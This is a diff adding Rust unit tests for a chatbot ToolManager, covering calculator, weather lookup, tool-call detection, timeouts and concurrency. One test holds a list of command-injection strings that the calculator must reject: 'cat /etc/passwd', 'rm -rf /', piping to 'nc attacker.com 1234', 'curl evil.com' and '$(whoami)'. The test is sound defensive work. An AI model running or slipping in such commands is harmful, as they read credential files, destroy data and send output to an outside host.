@@ -315,6 +315,8 @@ mod tests {
         ToolManager::new(Client::new())
     }
 
+    // === Tool Detection Tests ===
+
     #[test]
     fn test_detect_tool_call_calculator() {
         let manager = create_test_tool_manager();
@@ -392,6 +394,8 @@ mod tests {
         assert!(result.is_none());
     }
 
+    // === Calculator Tests ===
+
     #[tokio::test]
     async fn test_calculate_valid_expressions() {
         let manager = create_test_tool_manager();
@@ -441,6 +445,183 @@ mod tests {
         assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
     }
 
+    // === Enhanced Error and Edge Case Tests ===
+
+    #[tokio::test]
+    async fn test_calculate_complex_valid_expressions() {
+        let manager = create_test_tool_manager();
+
+        // Test parentheses
+        let result = manager.calculate("(2 + 3) * 4").await;
+        assert!(result.is_ok());
+        let tool_result = result.unwrap();
+        assert!(tool_result.content.contains("(2 + 3) * 4 = 20"));
+
+        // Test powers
+        let result = manager.calculate("2^3").await;
+        assert!(result.is_ok());
+        let tool_result = result.unwrap();
+        assert!(tool_result.content.contains("2^3 = 8"));
+
+        // Test decimal numbers
+        let result = manager.calculate("3.14 * 2").await;
+        assert!(result.is_ok());
+        let tool_result = result.unwrap();
+        assert!(tool_result.content.contains("3.14 * 2"));
+    }
+
+    #[tokio::test]
+    async fn test_calculate_security_edge_cases() {
+        let manager = create_test_tool_manager();
+
+        // Test potential command injection attempts
+        let dangerous_inputs = vec![
+            "2 + 3; cat /etc/passwd",
+            "1 + 1 && rm -rf /",
+            "2 * 3 | nc attacker.com 1234",
+            "1 + 1; curl evil.com",
+            "$(whoami)",
+            "`ls -la`",
+            "2 + 3\nquit\nrm file",
+        ];
+
+        for input in dangerous_inputs {
+            let result = manager.calculate(input).await;
+            assert!(result.is_err(), "Should reject dangerous input: {}", input);
+            assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
+        }
+    }
+
+    #[tokio::test]
+    async fn test_calculate_boundary_conditions() {
+        let manager = create_test_tool_manager();
+
+        // Test empty expression
+        let result = manager.calculate("").await;
+        assert!(result.is_err());
+
+        // Test whitespace only
+        let result = manager.calculate("   ").await;
+        assert!(result.is_err());
+
+        // Test exactly at length limit (200 chars)
+        let boundary_expr = "1+".repeat(99) + "1"; // 199 chars
+        let result = manager.calculate(&boundary_expr).await;
+        assert!(result.is_ok(), "Should accept expression at boundary");
+
+        // Test just over length limit
+        let over_limit_expr = "1+".repeat(101); // 202 chars
+        let result = manager.calculate(&over_limit_expr).await;
+        assert!(result.is_err());
+        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
+    }
+
+    #[tokio::test]
+    async fn test_calculate_bc_error_handling() {
+        let manager = create_test_tool_manager();
+
+        // Test mathematical errors that bc would reject
+        let invalid_math_inputs = vec![
+            "1 / 0",   // Division by zero
+            "1 + + 2", // Invalid syntax
+            "(((",     // Unmatched parentheses
+            "2 ** 3",  // Invalid operator for bc
+        ];
+
+        for input in invalid_math_inputs {
+            let result = manager.calculate(input).await;
+            // These should either error or be handled gracefully
+            // bc might return an error or empty result
+            match result {
+                Ok(_) => {} // bc handled it somehow
+                Err(e) => {
+                    // Should be either NoResult or ProcessExecution error
+                    assert!(matches!(
+                        e,
+                        ToolError::NoResult | ToolError::ProcessExecution(_)
+                    ));
+                }
+            }
+        }
+    }
+
+    // === Weather Tests (Mock/Error Cases) ===
+
+    #[tokio::test]
+    async fn test_weather_api_network_timeout() {
+        // Create a client with very short timeout to force network errors
+        let client = reqwest::ClientBuilder::new()
+            .timeout(std::time::Duration::from_millis(1))
+            .build()
+            .unwrap();
+        let manager = ToolManager::new(client);
+
+        let result = manager.get_weather("London").await;
+        assert!(result.is_err());
+        assert!(matches!(result.unwrap_err(), ToolError::HttpRequest(_)));
+    }
+
+    #[tokio::test]
+    async fn test_weather_invalid_location() {
+        let manager = create_test_tool_manager();
+
+        // Test with clearly invalid location
+        let result = manager.get_weather("ThisIsNotARealPlace12345").await;
+        // Weather API might still return data or error - both are acceptable
+        // The important thing is we don't panic and handle the response properly
+        match result {
+            Ok(_) => {} // API returned something
+            Err(e) => {
+                // Should be one of our defined error types
+                assert!(matches!(
+                    e,
+                    ToolError::HttpRequest(_) | ToolError::JsonParsing(_) | ToolError::NoResult
+                ));
+            }
+        }
+    }
+
+    // === Tool Execution Tests ===
+
+    #[tokio::test]
+    async fn test_execute_tool_calculator() {
+        let manager = create_test_tool_manager();
+
+        let tool_call = ToolCall::Calculator {
+            expression: "5 + 3".to_string(),
+        };
+
+        let result = manager.execute_tool(tool_call).await;
+        assert!(result.is_ok());
+        assert!(result.unwrap().content.contains("5 + 3 = 8"));
+    }
+
+    #[tokio::test]
+    async fn test_execute_tool_weather() {
+        let manager = create_test_tool_manager();
+
+        let tool_call = ToolCall::Weather {
+            location: "London".to_string(),
+        };
+
+        let result = manager.execute_tool(tool_call).await;
+        // Weather might succeed or fail depending on network
+        // Both are acceptable for this test
+        match result {
+            Ok(tool_result) => {
+                assert!(tool_result.content.contains("London"));
+            }
+            Err(e) => {
+                assert!(matches!(
+                    e,
+                    ToolError::HttpRequest(_) | ToolError::JsonParsing(_) | ToolError::NoResult
+                ));
+            }
+        }
+    }
+
+    // === Error Display Tests ===
+
     #[test]
     fn test_tool_error_display() {
         let error = ToolError::InvalidInput("test error".to_string());
@@ -458,6 +639,8 @@ mod tests {
         let error = ToolError::NoResult;
         assert_eq!(error.to_string(), "No result returned");
     }
+
+    // === Location and Math Parsing Edge Cases ===
 
     #[test]
     fn test_location_parsing_edge_cases() {
@@ -506,5 +689,154 @@ mod tests {
         if let Some(ToolCall::Calculator { expression }) = result {
             assert_eq!(expression, "5 + 5");
         }
+    }
+
+    // === Advanced Math Detection Tests ===
+
+    #[test]
+    fn test_math_detection_comprehensive() {
+        let manager = create_test_tool_manager();
+
+        // Test various math question formats
+        let math_questions = vec![
+            ("what's 10 + 5", "10 + 5"),
+            ("solve 2 * 6", "2 * 6"),
+            ("calculate (3 + 4) / 2", "(3 + 4) / 2"),
+            ("what is 2^8?", "2^8"),
+            ("7 - 3", "7 - 3"),
+        ];
+
+        for (input, expected) in math_questions {
+            let result = manager.detect_tool_call(input);
+            assert!(
+                matches!(result, Some(ToolCall::Calculator { .. })),
+                "Should detect math in: {}",
+                input
+            );
+            if let Some(ToolCall::Calculator { expression }) = result {
+                assert_eq!(
+                    expression, expected,
+                    "Wrong expression extracted from: {}",
+                    input
+                );
+            }
+        }
+
+        // Test non-math that contains numbers
+        let non_math = vec!["room 101", "year 2024", "I have 5 cats", "channel 7 news"];
+
+        for input in non_math {
+            let result = manager.detect_tool_call(input);
+            assert!(result.is_none(), "Should not detect math in: {}", input);
+        }
+    }
+
+    #[test]
+    fn test_weather_detection_comprehensive() {
+        let manager = create_test_tool_manager();
+
+        // Test various weather question formats
+        let weather_questions = vec![
+            ("weather in Paris", "Paris"),
+            ("what's the weather for Tokyo", "Tokyo"),
+            ("check weather Berlin", "London"), // Default when no "in/for"
+            ("weather forecast London", "London"), // Default when no "in/for"
+            ("how's the weather", "London"),    // Default
+        ];
+
+        for (input, expected) in weather_questions {
+            let result = manager.detect_tool_call(input);
+            assert!(
+                matches!(result, Some(ToolCall::Weather { .. })),
+                "Should detect weather in: {}",
+                input
+            );
+            if let Some(ToolCall::Weather { location }) = result {
+                assert_eq!(
+                    location, expected,
+                    "Wrong location extracted from: {}",
+                    input
+                );
+            }
+        }
+    }
+
+    // === Async Cancellation and Timeout Tests ===
+
+    #[tokio::test]
+    async fn test_calculate_task_cancellation() {
+        let manager = create_test_tool_manager();
+
+        // Test that we can cancel a calculation task
+        let calc_future = manager.calculate("2 + 2");
+
+        // Create a timeout to simulate cancellation
+        let result = tokio::time::timeout(std::time::Duration::from_millis(10), calc_future).await;
+
+        // Either it completed quickly (ok) or timed out (also ok for this test)
+        match result {
+            Ok(calc_result) => {
+                assert!(calc_result.is_ok());
+            }
+            Err(_) => {
+                // Timeout occurred, which is fine for this test
+            }
+        }
+    }
+
+    // === Tool Result Content Validation ===
+
+    #[test]
+    fn test_tool_result_content_structure() {
+        let result = ToolResult {
+            content: "Test content".to_string(),
+        };
+
+        assert_eq!(result.content, "Test content");
+    }
+
+    #[test]
+    fn test_tool_call_variants() {
+        // Test that ToolCall variants have expected structure
+        let weather_call = ToolCall::Weather {
+            location: "Paris".to_string(),
+        };
+
+        let calc_call = ToolCall::Calculator {
+            expression: "2 + 2".to_string(),
+        };
+
+        // Verify they can be pattern matched
+        match weather_call {
+            ToolCall::Weather { location } => assert_eq!(location, "Paris"),
+            _ => panic!("Wrong variant"),
+        }
+
+        match calc_call {
+            ToolCall::Calculator { expression } => assert_eq!(expression, "2 + 2"),
+            _ => panic!("Wrong variant"),
+        }
+    }
+
+    // === Concurrent Execution Tests ===
+
+    #[tokio::test]
+    async fn test_concurrent_tool_execution() {
+        let manager = create_test_tool_manager();
+
+        // Execute multiple calculations concurrently
+        let calc1 = manager.calculate("1 + 1");
+        let calc2 = manager.calculate("2 + 2");
+        let calc3 = manager.calculate("3 + 3");
+
+        let (result1, result2, result3) = tokio::join!(calc1, calc2, calc3);
+
+        assert!(result1.is_ok());
+        assert!(result2.is_ok());
+        assert!(result3.is_ok());
+
+        assert!(result1.unwrap().content.contains("1 + 1 = 2"));
+        assert!(result2.unwrap().content.contains("2 + 2 = 4"));
+        assert!(result3.unwrap().content.contains("3 + 3 = 6"));
     }
 }
